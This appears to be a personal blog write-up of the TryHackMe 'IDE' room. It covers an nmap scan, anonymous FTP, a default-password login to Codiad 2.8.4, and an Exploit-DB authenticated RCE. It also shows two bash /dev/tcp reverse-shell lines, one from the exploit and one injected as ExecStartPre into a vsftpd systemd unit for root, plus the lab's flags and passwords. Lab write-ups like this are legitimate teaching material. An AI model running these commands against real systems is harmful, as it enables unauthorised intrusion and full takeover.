---
layout: post
title: "THM IDE Writeup"
date: 2026-03-10
categories: [TryHackMe]
tage: [thm, writeup]
---

IDE writeup

make sure the host is up - ping 10.x.x.x

nmap -sV -sC -T4 -p- 10.x.x.x

my go to scan for CTFs
```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 23:48 -0400
Nmap scan report for 10.67.134.170
Host is up (0.032s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.150.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Codiad 2.8.4
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.08 seconds
```

ftp is open with anonymous login allowed, probably the first thing ill look at
80 and 62337 are also open for http, lets also check that

``` bash
ftp> ls
229 Entering Extended Passive Mode (|||42192|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> ls -la
229 Entering Extended Passive Mode (|||55005|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||61662|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
226 Directory send OK.
ftp> get -
local: - remote: -
229 Entering Extended Passive Mode (|||32017|)
150 Opening BINARY mode data connection for - (151 bytes).
100% |*****************************************************************|   151      209.46 KiB/s    00:00 ETA
226 Transfer complete.
151 bytes received in 00:00 (3.98 KiB/s)
ftp> 

```

cool, we got a file, lets check it out

``` bash
                                                                                                              
┌──(kali㉿kali)-[~/Documents/thm]
└─$ cp - dash                                              
                                                                                                              
┌──(kali㉿kali)-[~/Documents/thm]
└─$ ls    
-  dash  
                                                                                                              
┌──(kali㉿kali)-[~/Documents/thm]
└─$ cat dash   
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```
we got a username and most likey a password, I would guess its somewhere in the html of the http sites we found!

lets check..

visit 10.x.x.x:80 and :62337
port 80 was the defaul apache page, port 62337 is a log in portal! (saddly no hidden passwords in the html)

I was going to try and bruteforce it with hydra, however the note said it was a default password, likey a hint that its easy, I tried password and it was correct yay!

Now that we have credentials, lets see if we can find an exploit

Just looking at searchsploit, we found this:

``` bash
┌──(kali㉿kali)-[~/Documents/thm]
└─$ searchsploit codiad                  
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                     | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                         | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)                        | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                    | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                    | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                    | multiple/webapps/50474.txt

```
Perfect, the site is in Codiad 2.8.4 - Lets copy one of them over and exploit 

``` bash

┌──(kali㉿kali)-[~/Documents/thm]
└─$ cp /usr/share/exploitdb/exploits/multiple/webapps/49705.py .

```
now, how does it work?

``` bash
┌──(kali㉿kali)-[~/Documents/thm]
└─$ python3 49705.py   
Usage : 
        python 49705.py [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
        python 49705.py [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
Example : 
        python 49705.py http://localhost/ admin admin 8.8.8.8 8888 linux
        python 49705.py http://localhost:8080/ admin admin 8.8.8.8 8888 windows
Author : 
        WangYihang <wangyihanger@gmail.com>
                                                                
```

ok, so we type in the creds, and hit enter:

``` bash
┌──(kali㉿kali)-[~/Documents/thm]
└─$ python 49705.py http://10.67.134.170:62337/ john password 192.168.150.103 9001 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/192.168.150.103/9002 0>&1 2>&1"' | nc -lnvp 9001
nc -lnvp 9002
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...



```
as well as 

``` bash
echo 'bash -c "bash -i >/dev/tcp/192.168.150.103/9002 0>&1 2>&1"' | nc -lnvp 9001

```
AND 
``` bash
┌──(kali㉿kali)-[~/Documents/thm]
└─$ nc -lnvp 9002
listening on [any] 9002 ...
connect to [192.168.150.103] from (UNKNOWN) [10.67.134.170] 38720
bash: cannot set terminal process group (952): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ide:/var/www/html/codiad/components/filemanager$ whoami

```
which gives us our shell.
different terminals, interesting payload...

either way we have a shell, look for flags and try to get root!

``` bash
www-data@ide:/var/www/html/codiad/components/filemanager$ cd /
cd /
www-data@ide:/$ cd home
cd home
www-data@ide:/home$ ls
ls
drac
www-data@ide:/home$ cd drac
cd drac
www-data@ide:/home/drac$ ls
ls
user.txt
www-data@ide:/home/drac$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@ide:/home/drac$ ls -la
ls -la
total 52
drwxr-xr-x 6 drac drac 4096 Aug  4  2021 .
drwxr-xr-x 3 root root 4096 Jun 17  2021 ..
-rw------- 1 drac drac   49 Jun 18  2021 .Xauthority
-rw-r--r-- 1 drac drac   36 Jul 11  2021 .bash_history
-rw-r--r-- 1 drac drac  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 drac drac 3787 Jul 11  2021 .bashrc
drwx------ 4 drac drac 4096 Jun 18  2021 .cache
drwxr-x--- 3 drac drac 4096 Jun 18  2021 .config
drwx------ 4 drac drac 4096 Jun 18  2021 .gnupg
drwx------ 3 drac drac 4096 Jun 18  2021 .local
-rw-r--r-- 1 drac drac  807 Apr  4  2018 .profile
-rw-r--r-- 1 drac drac    0 Jun 17  2021 .sudo_as_admin_successful
-rw------- 1 drac drac  557 Jun 18  2021 .xsession-errors
-r-------- 1 drac drac   33 Jun 18  2021 user.txt
www-data@ide:/home/drac$ cat .bash_history
cat .bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'
www-data@ide:/home/drac$ 

```
nice, drac's password

Lets try to read that flag now:

``` bash
www-data@ide:/home/drac$ su drac
su drac
su: must be run from a terminal
www-data@ide:/home/drac$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ide:/home/drac$ whoami
whoami
www-data
www-data@ide:/home/drac$ su drac
su drac
Password: Th3dRaCULa1sR3aL

drac@ide:~$ cat user.txt
cat user.txt
02930d21a8eb009f6d26361b2d24a466
drac@ide:~$ 

```
We had to upgrade to a shell, but we got our first flag!


Escilate now!
``` bash
drac@ide:/$ sudo -l
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart


```

lets make things easier, since we have credentials im just going to ssh in!

``` bash
ssh drac@10.x.x.x
```
Doing some research, I found this article https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation which helped me escilate!

we found the location:
``` bash
drac@ide:/usr/sbin$ locate 'vsftpd.service'
/etc/systemd/system/multi-user.target.wants/vsftpd.service

/lib/systemd/system/vsftpd.service	this one!

/var/lib/lxcfs/cgroup/blkio/system.slice/vsftpd.service
/var/lib/lxcfs/cgroup/cpu,cpuacct/system.slice/vsftpd.service
... many more

```

This part of the artcile:
```bash
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/<local-ip>/4444 0>&1'

[Install]
WantedBy=multi-user.target
```

we add that to our file but with our ip,

and start a nc listening on that port, then restart the daemon!

```bash
drac@ide:/lib/systemd/system$ vim vsftpd.service 
drac@ide:/lib/systemd/system$ systemctl daemon-reload 
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.                                                       
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===
drac@ide:/lib/systemd/system$ sudo /usr/sbin/service vsftpd restart                                           

```
and shell (make sure to do this before you restart)
```bash
┌──(kali㉿kali)-[~/Documents/thm]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [192.168.150.103] from (UNKNOWN) [10.67.134.170] 59390
bash: cannot set terminal process group (2770): Inappropriate ioctl for device
bash: no job control in this shell
root@ide:/# whoami
whoami
root
root@ide:/# cd root
cd root
root@ide:/root# cat root.txt
cat root.txt
ce258cb16f47f1c66f0b0b77f4e0fb8d
root@ide:/root# 

```

Room done!

Thank you for reading, and thanks to LINK for the really helpful priv esc!





